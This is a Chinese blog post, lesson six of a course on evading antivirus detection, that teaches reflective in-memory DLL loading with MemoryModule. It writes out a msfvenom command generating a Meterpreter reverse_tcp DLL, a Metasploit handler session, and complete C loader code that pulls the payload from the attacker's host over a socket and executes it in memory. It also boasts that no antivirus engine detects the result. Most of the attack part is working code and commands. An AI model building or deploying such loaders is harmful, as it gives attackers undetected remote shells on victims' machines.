<!DOCTYPE html>
<html lang=""><head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <title>静态恶意代码逃逸（第六课） « 倾旋的博客</title>
    <meta name="description" content="倾旋的博客">
    <meta name="author" content='倾旋'>

    <link rel="stylesheet" href="/css/Font-Awesome-5.15.3.all.min.css">

    
    <link rel="stylesheet" href="/sass/researcher.min.css">
    
    
        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
    

    
        
    
</head>

    <body>
<input type="checkbox" id="menu-toggle" class="menu-toggle">
<label tabindex="0" for="menu-toggle" class="burger"><span></span> <span></span> <span></span><div class="burger-text">Menu</div></label>
<nav class="main-nav">
    
    <ul>
    
        
        
            <li><a href="/projects/">Projects</a></li>
        
            <li><a href="/links/">Links</a></li>
        
            <li><a href="/post/">Posts</a></li>
        
            <li><a href="/index.xml">Rss</a></li>
        
            <li><a href="/tools/">Tools</a></li>
        
    
    </ul>
   
</nav>
<nav><a href="/" class="all-posts-link">‹ All Posts</a></nav><div id="content">
<div class="container">
    <h1>静态恶意代码逃逸（第六课）</h1>
    <p>本节课，我们来代入一个新的技术，这个技术与Windows PE格式的基础知识关联性较强，目的是实现全球AV查杀0报警的效果。</p>
        <div class = "toc-wrapper">
            
<div class="post-toc" id="post-toc">
<aside>
    
    
    
    <nav id="TableOfContents">
  <ul>
    <li><a href="#0x01-memorymodule">0x01 MemoryModule</a></li>
    <li><a href="#0x02-反射dll加载的实验">0x02 反射DLL加载的实验</a></li>
    <li><a href="#0x03-反射dll与msf联动">0x03 反射DLL与MSF联动</a>
      <ul>
        <li><a href="#生成dll">生成DLL</a></li>
      </ul>
    </li>
    <li><a href="#0x04-总结">0x04 总结</a></li>
  </ul>
</nav>
    
    
</aside>
<a href="#" id="toc-toggle"></a>
</div>



        </div>
    <p>代码将会上传至Github，方便读者下载研究 : <a href="https://github.com/Rvn0xsy/BadCode">https://github.com/Rvn0xsy/BadCode</a></p>
<h2 id="0x01-memorymodule">0x01 MemoryModule</h2>
<p>先来介绍以下MemoryModule这个项目的来源。</p>
<p><a href="https://payloads.online/archivers/2019-03-14/1">MemoryModule-实现原理</a></p>
<p>项目背景：Windows操作系统在执行一个Windows PE格式的文件时，Windows自身是有一个Windows PE格式的解析器，通过PE格式把文件的各个节放入不同的内存区域。</p>
<p>爱折腾的程序员自己也想实现这个过程，那就是反射，这个反射机制就是将Windows PE格式通过自己写的代码进行解析，并把不同的节数据加载到内存中，通常这个反射加载技术被很多APT组织、大型渗透框架、病毒作者使用比较广泛。</p>
<p>当一个Windows PE格式的文件变成了一个内存中的字符串，意味着这个文件可以被任意方式去转换、加密、混淆，因此反病毒软件也难以查杀。</p>
<p>MemoryModule就是实现了这个过程：https://github.com/fancycode/MemoryModule</p>
<p>但是资料都是英文的，我在国内的社区上找到了中文版本的：https://gitee.com/china_jeffery/MemoryModule</p>
<h2 id="0x02-反射dll加载的实验">0x02 反射DLL加载的实验</h2>
<p>首先体验一下正常DLL加载的过程：</p>
<p>写一个DLL：</p>
<pre tabindex="0"><code>#include &lt;Windows.h&gt;

VOID msg(VOID){
	MessageBox(NULL,TEXT(&#34;Test&#34;),TEXT(&#34;Hello&#34;),MB_OK);
	return;
}
</code></pre><p>这里我采用了Def文件来进行导出：</p>
<p><img src="../../../static/images/81d0151a-4f5f-11ec-a1bd-00d861bf4abb.png" alt="2020-01-03-13-05-56"></p>
<p><img src="../../../static/images/820ac94e-4f5f-11ec-ba78-00d861bf4abb.png" alt="2020-01-03-13-06-15"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">VOID</span> (<span style="color:#f92672">*</span>msg)(VOID);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	msg RunMsg;
</span></span><span style="display:flex;"><span>	HMODULE  hBadCode <span style="color:#f92672">=</span> LoadLibrary(TEXT(<span style="color:#e6db74">&#34;BadCode-DLL.dll&#34;</span>));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	RunMsg <span style="color:#f92672">=</span> (msg)GetProcAddress(hBadCode,<span style="color:#e6db74">&#34;msg&#34;</span>);
</span></span><span style="display:flex;"><span>	RunMsg();
</span></span><span style="display:flex;"><span>	FreeLibrary(hBadCode);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>通过LoadLibrary这个API来加载DLL文件，使其运行，看起来是一个基础操作，那么还有另外一种方式吗？</p>
<p>接下来贴上MemoryModule的使用方法：</p>
<ol>
<li>将要加载的PE文件读入内存</li>
<li>初始化MemoryModule句柄</li>
<li>装载内存</li>
<li>获得导出函数地址</li>
<li>执行导出函数</li>
<li>释放MemoryModule句柄</li>
</ol>
<p>这里我将MemoryModule项目代码放入当前项目：</p>
<p><img src="../../../static/images/824455c4-4f5f-11ec-b777-00d861bf4abb.png" alt="2020-01-03-13-06-38"></p>
<p>主要是：<code>MemoryModule.h</code>、<code>MemoryModule.cpp</code></p>
<p>加载代码</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;MemoryModule.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">VOID</span> (<span style="color:#f92672">*</span>msg)(VOID);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 打开文件并获取大小
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>DWORD <span style="color:#a6e22e">OpenBadCodeDLL</span>(HANDLE <span style="color:#f92672">&amp;</span> hBadCodeDll, LPCWSTR lpwszBadCodeFileName){
</span></span><span style="display:flex;"><span>	DWORD dwHighFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>	DWORD dwLowFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 打开文件
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	hBadCodeDll <span style="color:#f92672">=</span> CreateFile(lpwszBadCodeFileName,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL ,NULL);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(hBadCodeDll <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE){
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> GetLastError();
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	dwLowFileSize <span style="color:#f92672">=</span> GetFileSize(hBadCodeDll,<span style="color:#f92672">&amp;</span>dwHighFileSize);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> dwLowFileSize;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	msg RunMsg;  <span style="color:#75715e">// msg函数的函数指针
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	HMEMORYMODULE hModule; <span style="color:#75715e">// MemoryModule句柄，应该可以这么理解,,
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	HANDLE hBadCodeDll <span style="color:#f92672">=</span> INVALID_HANDLE_VALUE; <span style="color:#75715e">// 打开PE文件的句柄
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	WCHAR szBadCodeFile[] <span style="color:#f92672">=</span> TEXT(<span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">admin</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Documents</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Visual Studio 2012</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Projects</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">BadCode</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Debug</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">BadCode-DLL.dll&#34;</span>); <span style="color:#75715e">// PE文件的物理路径
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	DWORD dwFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#75715e">// PE文件大小
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	DWORD dwReadOfFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#75715e">// 已读取的PE文件大小
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	PBYTE bFileBuffer <span style="color:#f92672">=</span> NULL; <span style="color:#75715e">// PE文件的内存地址
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 打开文件
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	dwFileSize <span style="color:#f92672">=</span> OpenBadCodeDLL(hBadCodeDll, szBadCodeFile);
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 如果打开失败直接退出
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span>(hBadCodeDll <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE){
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> GetLastError();
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 申请放置PE文件的内存空间
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	bFileBuffer <span style="color:#f92672">=</span> new BYTE[dwFileSize];
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 读取文件
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	ReadFile(hBadCodeDll,bFileBuffer,dwFileSize,<span style="color:#f92672">&amp;</span>dwReadOfFileSize,NULL);
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 如果读取错误直接退出
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span>(dwReadOfFileSize <span style="color:#f92672">!=</span> dwFileSize){
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> GetLastError();
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 关闭打开PE文件的句柄
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	CloseHandle(hBadCodeDll);
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 导入PE文件
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	hModule <span style="color:#f92672">=</span> MemoryLoadLibrary(bFileBuffer);
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 如果加载失败，就退出
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span>(hModule <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>		delete [] bFileBuffer;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 获取msg导出函数地址
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	RunMsg <span style="color:#f92672">=</span> (msg)MemoryGetProcAddress(hModule,<span style="color:#e6db74">&#34;msg&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 运行msg函数
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	RunMsg();
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 释放资源
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	MemoryFreeLibrary(hModule);
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 释放PE内存
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	delete [] bFileBuffer;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> GetLastError();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>运行结果：</p>
<p><img src="../../../static/images/8277ad7a-4f5f-11ec-9a01-00d861bf4abb.png" alt="2020-01-03-13-06-52"></p>
<p>能够看到，成功加载并执行了msg函数。</p>
<h2 id="0x03-反射dll与msf联动">0x03 反射DLL与MSF联动</h2>
<p>不知道大家还是否记得第五课的Socket方式加载Shellcode，这里我将复用第五课的代码来实现与MSF的联动免杀。</p>
<p>思路是这样的：</p>
<p>通过Socket将Msf生成的DLL给接收到内存中，然后载入MemoryModule中，直接执行。</p>
<h3 id="生成dll">生成DLL</h3>
<pre tabindex="0"><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.170.138 LPORT=8899 -f dll -o ~/y.dll
</code></pre><p><img src="../../../static/images/82b32ae4-4f5f-11ec-80f1-00d861bf4abb.png" alt="2020-01-03-13-07-02"></p>
<p><strong>生成了一个5120字节的DLL</strong></p>
<p>然后设置一下MSF DLL发射器：</p>
<pre tabindex="0"><code>msf5 &gt; handler -p windows/x64/meterpreter/reverse_tcp -H 192.168.170.138 -P 8899
[*] Payload handler running as background job 0.

[*] Started reverse TCP handler on 192.168.170.138:8899 
msf5 &gt; use exploit/multi/handler 
msf5 exploit(multi/handler) &gt; set payload windows/patchupdllinject/reverse_tcp
payload =&gt; windows/patchupdllinject/reverse_tcp
msf5 exploit(multi/handler) &gt; set LHOST 192.168.170.138 
LHOST =&gt; 192.168.170.138
msf5 exploit(multi/handler) &gt; set LPORT 8888
LPORT =&gt; 8888
msf5 exploit(multi/handler) &gt; set DLL ~/y.dll
DLL =&gt; ~/y.dll
msf5 exploit(multi/handler) &gt; exploit -j
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.170.138:8888 
msf5 exploit(multi/handler) &gt; 
</code></pre><p>此时就需要来撸码了，实现一个客户端，去Msf上获取DLL：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;WinSock2.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;MemoryModule.h&#34;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma comment(lib,&#34;ws2_32.lib&#34;)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define PAYLOAD_SIZE 1024*512
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">BOOL</span> (<span style="color:#f92672">*</span>Module)(HMODULE hModule, DWORD ul_reason_for_call , LPVOID lpReserved);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">VOID</span> (<span style="color:#f92672">*</span>msg)(VOID);
</span></span><span style="display:flex;"><span>PBYTE bFileBuffer <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">GetPEDLL</span>(){
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	DWORD dwError;
</span></span><span style="display:flex;"><span>	WORD sockVersion <span style="color:#f92672">=</span> MAKEWORD(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>	WSADATA wsaData;
</span></span><span style="display:flex;"><span>	SOCKET socks;
</span></span><span style="display:flex;"><span>	SHORT sListenPort <span style="color:#f92672">=</span> <span style="color:#ae81ff">8888</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> sockaddr_in sin;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (WSAStartup(sockVersion, <span style="color:#f92672">&amp;</span>wsaData) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		dwError <span style="color:#f92672">=</span> GetLastError();
</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">&#34;[*]WSAStarup Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,dwError);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	socks <span style="color:#f92672">=</span> socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (socks <span style="color:#f92672">==</span> INVALID_SOCKET)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		dwError <span style="color:#f92672">=</span> GetLastError();
</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">&#34;[*]Socket Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,dwError);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	sin.sin_family <span style="color:#f92672">=</span> AF_INET;
</span></span><span style="display:flex;"><span>	sin.sin_port <span style="color:#f92672">=</span> htons(sListenPort);
</span></span><span style="display:flex;"><span>	sin.sin_addr.S_un.S_addr <span style="color:#f92672">=</span> inet_addr(<span style="color:#e6db74">&#34;192.168.170.138&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(connect(socks,(<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>sin,<span style="color:#66d9ef">sizeof</span>(sin)) <span style="color:#f92672">==</span> SOCKET_ERROR )
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		dwError <span style="color:#f92672">=</span> GetLastError();
</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">&#34;[*]Bind Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,dwError);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> recv(socks,(PCHAR)bFileBuffer,<span style="color:#ae81ff">4</span>,NULL);
</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> recv(socks,(PCHAR)bFileBuffer,<span style="color:#ae81ff">2650</span>,NULL);
</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> recv(socks,(PCHAR)bFileBuffer,<span style="color:#ae81ff">4</span>,NULL);
</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> recv(socks,(PCHAR)bFileBuffer,<span style="color:#ae81ff">4</span>,NULL);
</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> recv(socks,(PCHAR)bFileBuffer,<span style="color:#ae81ff">4</span>,NULL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	ZeroMemory(bFileBuffer,PAYLOAD_SIZE);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	ret <span style="color:#f92672">=</span> recv(socks,(PCHAR)bFileBuffer,<span style="color:#ae81ff">5120</span>,NULL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>	{
</span></span><span style="display:flex;"><span>		closesocket(socks);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> TRUE;
</span></span><span style="display:flex;"><span>} 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 打开文件并获取大小
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>DWORD <span style="color:#a6e22e">OpenBadCodeDLL</span>(HANDLE <span style="color:#f92672">&amp;</span> hBadCodeDll, LPCWSTR lpwszBadCodeFileName){
</span></span><span style="display:flex;"><span>	DWORD dwHighFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>	DWORD dwLowFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 打开文件
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	hBadCodeDll <span style="color:#f92672">=</span> CreateFile(lpwszBadCodeFileName,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL ,NULL);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(hBadCodeDll <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE){
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> GetLastError();
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	dwLowFileSize <span style="color:#f92672">=</span> GetFileSize(hBadCodeDll,<span style="color:#f92672">&amp;</span>dwHighFileSize);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> dwLowFileSize;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	HMEMORYMODULE hModule;
</span></span><span style="display:flex;"><span>	Module DllMain;
</span></span><span style="display:flex;"><span>	bFileBuffer <span style="color:#f92672">=</span> new BYTE[PAYLOAD_SIZE];
</span></span><span style="display:flex;"><span>	GetPEDLL();
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 导入PE文件
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	hModule <span style="color:#f92672">=</span> MemoryLoadLibrary(bFileBuffer);
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 如果加载失败，就退出
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span>(hModule <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>		delete [] bFileBuffer;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 获取msg导出函数地址
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	DllMain <span style="color:#f92672">=</span> (Module)MemoryGetProcAddress(hModule,<span style="color:#e6db74">&#34;DllMain&#34;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 运行msg函数
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	DllMain(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 释放资源
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	DWORD dwThread;
</span></span><span style="display:flex;"><span>	HANDLE hThread <span style="color:#f92672">=</span> CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)DllMain,NULL,NULL,<span style="color:#f92672">&amp;</span>dwThread);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	WaitForSingleObject(hThread,INFINITE);
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	MemoryFreeLibrary(hModule);
</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 释放PE内存
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	delete [] bFileBuffer;
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> GetLastError();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>GetPEDLL函数主要是从MSF上获取DLL，通过recv函数不断接收，偏移获得DLL地址，然后扔给MemoryGetProcAddress。</p>
<p>实现效果如下：</p>
<p><img src="../../../static/images/82f319d8-4f5f-11ec-a688-00d861bf4abb.png" alt="2020-01-03-13-07-19"></p>
<h2 id="0x04-总结">0x04 总结</h2>
<p>注意：学习的过程中，不同位数要对应不同的payload，编译平台也要互相对应</p>
<p>第六课就到这里了，主要是引入反射DLL加载这个技术，以及如何使用这个技术，如果想深入研究，还需要学习Windows PE相关的基础知识。</p>
<p>老样子，V站查杀一下：</p>
<p><img src="../../../static/images/832a3850-4f5f-11ec-86bb-00d861bf4abb.png" alt="2020-01-03-13-07-29"></p>
<p>挑战了全球的AV，全部通过</p>
<p><a href="https://www.virustotal.com/gui/file/f27a16434684986206921c63a3d5d71e5ede3f95a6175fd9572a5b5029adc28c/detection">https://www.virustotal.com/gui/file/f27a16434684986206921c63a3d5d71e5ede3f95a6175fd9572a5b5029adc28c/detection</a></p>
<p>所有的新技术，都离不开强大的基础知识的铺垫，通过积攒基础知识，使自己能挑战更多的&quot;不可能&quot;。</p>

</div>
<div class="container">
    <script src="https://giscus.app/client.js"
    data-repo="Rvn0xsy/rvn0xsy.github.io"
    data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY="
    data-category="General"
    data-category-id="DIC_kwDOF-pTTM4CRDk_"
    data-mapping="title"
    data-strict="0"
    data-reactions-enabled="1"
    data-emit-metadata="0"
    data-input-position="bottom"
    data-theme="dark_tritanopia"
    data-lang="zh-CN"
    data-loading="lazy"
    crossorigin="anonymous"
    async>
  </script>
</div>
<div class="container">
    <section class="bio" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
    <div class="bio__blurb">
        <h2 class="site-h2">网络安全爱好者、安全工具开发者</h2>
        <p>现阶段在进行红队相关的工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p>
    </div>
<div class="bio__avatar">
    <img src="/avatar.jpeg" alt="Duncan McDougall and heir apparent">
</div></section>
</div>

        </div>
<footer class="site-footer">
    <div class="container">
        <div class="site-footer__col">
        <h5>Get in touch</h5>
        <p>
            If you like my project or have some questions,feel free
            to contact me</a>.
        </p>
        </div>
        <div class="site-footer__col site-footer__col--links">
        <h5>Me Elsewhere</h5>
        <ul>
        
                <li>
                    <a href="https://twitter.com/Rvn0xsy"><i class="fab fa-twitter"></i> Twitter</a>
                    
                </li>
        
                <li>
                    <a href="mailto:rvn0xsy@gmail.com"><i class="fas fa-envelope"></i> E-mail</a>
                    
                </li>
        
                <li>
                    <a href="https://github.com/Rvn0xsy"><i class="fab fa-github"></i> Github</a>
                    
                </li>
        
        </ul>
        </div>
        <div class="site-footer__col site-footer__col--links">
        <h5>Meta Links</h5>
        <ul>
            
                
                
                    <li class="">
                        <a href="/projects/"><i class="fas fa-code"></i> Projects</a>
                    </li>
                
                    <li class="">
                        <a href="/links/"><i class="fas fa-link"></i> Links</a>
                    </li>
                
                    <li class="">
                        <a href="/post/"><i class="fa fa-file-alt"></i> Posts</a>
                    </li>
                
                    <li class="">
                        <a href="/index.xml"><i class="fa fa-rss-square"></i> Rss</a>
                    </li>
                
                    <li class="">
                        <a href="/tools/"><i class="fas fa-tools"></i> Tools</a>
                    </li>
                
            
        </ul>
        </div>
        <p class="site-footer__copyright">
        © 倾旋 2021. All rights reserved.
        </p>
    </div>
    </footer>



